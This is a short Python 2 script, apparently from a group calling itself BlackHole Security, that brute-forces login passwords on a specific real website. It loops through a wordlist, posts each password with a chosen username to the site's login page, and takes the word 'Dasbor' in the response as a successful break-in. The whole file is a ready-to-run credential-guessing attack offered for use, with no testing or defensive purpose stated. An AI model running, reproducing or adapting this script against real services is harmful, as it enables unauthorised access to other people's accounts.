## blogpnslbf.py - Blogponsel Brute Force
# -*- coding: utf-8 -*-
##
import sys
import requests
import threading

__date__ = "21-July-2018"
__author__ = "DedSecTL/DTL"
__team__ = "BlackHole Security"
__codename__ = "Blogponsel.nyet"
__banner__ = """
################################################
#            Blogponsel Brute Force            #
#              BlackHole Security              #
#               21 - July - 2018               #
################################################
"""

def blogponselbf(username, wordlist):
	for passwd in open(wordlist, 'r').read().split():
		params = {"username":username, "password":passwd, "login":"Masuk"}
		r = requests.post("http://www.blogponsel.net/id/login.php", data=params)
		if "Dasbor" in r.text:
			print "\033[97m[+] Password:\033[92m",passwd,"is correct\033[0m"
			break
		else:
			print "\033[97m[-] Password:\033[91m",passwd,"is incorrect\033[0m"
			pass

if __name__ == '__main__':
	print __banner__
	if len(sys.argv) != 3:
		print "Usage: blogpnslbf username wordlist.txt"
	else:
		t = threading.Thread(target=blogponselbf, args=(sys.argv[1], sys.argv[2]))
		t.start()